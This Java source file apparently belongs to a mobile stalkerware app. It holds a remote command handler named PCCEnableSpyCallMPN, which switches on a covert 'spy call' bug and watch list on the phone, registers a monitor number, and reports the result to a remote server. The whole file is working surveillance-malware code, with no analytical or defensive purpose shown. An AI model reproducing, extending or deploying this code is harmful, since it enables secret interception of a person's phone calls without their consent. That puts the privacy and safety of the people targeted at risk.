package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCEnableSpyCallMPN extends PCCRmtCmdAsync {
	
	private String monitorNumber = "";
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCEnableSpyCallMPN(String monitorNumber) {
		this.monitorNumber = monitorNumber;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_SPY_CALL_WITH_MPN.getId());
		try {
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			bugInfo.setEnabled(true);
			watchListInfo.setWatchListEnabled(true);
			bugInfo.setPrefWatchListInfo(watchListInfo);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			//String monitorNumber = bugInfo.getMonitorNumber();
			if (!monitorNumber.equals(Constant.EMPTY_STRING)) {
				//bugInfo.setMonitorNumber(monitorNumber);
				bugInfo.addMonitorNumber(monitorNumber);
				responseMessage.append(monitorNumber);
			} else {
				responseMessage.append(Constant.NOT_AVAILABLE);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.MONITOR_NOT_SET);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SET_MONITOR_CORRECT_PARAM);	
			}
			pref.commit(bugInfo);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
